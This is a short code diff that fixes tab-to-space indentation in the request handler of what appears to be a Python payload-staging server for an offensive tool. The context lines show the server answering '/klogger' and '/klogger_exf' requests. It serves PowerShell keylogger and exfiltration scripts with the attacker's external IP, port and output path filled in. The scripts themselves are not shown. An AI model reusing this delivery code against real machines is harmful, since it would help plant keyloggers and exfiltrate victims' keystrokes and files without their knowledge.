@@ -53,10 +53,10 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 log('[-] File client_exf.ps1 does not exist.',print_console=True,trace_time=True)
                 self.send_response(404)
                 self.wfile.write(b'Not Found')
-	elif self.path == '/klogger':
+        elif self.path == '/klogger':
             try:
                 file_to_open = open('scripts/client_logger.ps1','r').read()
-		file_to_open = file_to_open.replace('OUTPUT_PATH',config.logger['OUTPUT_PATH'])
+                file_to_open = file_to_open.replace('OUTPUT_PATH',config.logger['OUTPUT_PATH'])
                 self.send_response(200)
                 self.send_header('Content-type', 'text')
                 self.end_headers()
@@ -66,12 +66,12 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 log('[-] File client_logger.ps1 does not exist.',print_console=True,trace_time=True)
                 self.send_response(404)
                 self.wfile.write(b'Not Found')
-	elif self.path == '/klogger_exf':
+        elif self.path == '/klogger_exf':
             try:
                 file_to_open = open('scripts/client_logger_exf.ps1','r').read()
                 file_to_open = file_to_open.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
                 file_to_open = file_to_open.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
-		file_to_open = file_to_open.replace('OUTPUT_PATH',config.logger['OUTPUT_PATH'])
+                file_to_open = file_to_open.replace('OUTPUT_PATH',config.logger['OUTPUT_PATH'])
                 self.send_response(200)
                 self.send_header('Content-type', 'text')
                 self.end_headers()
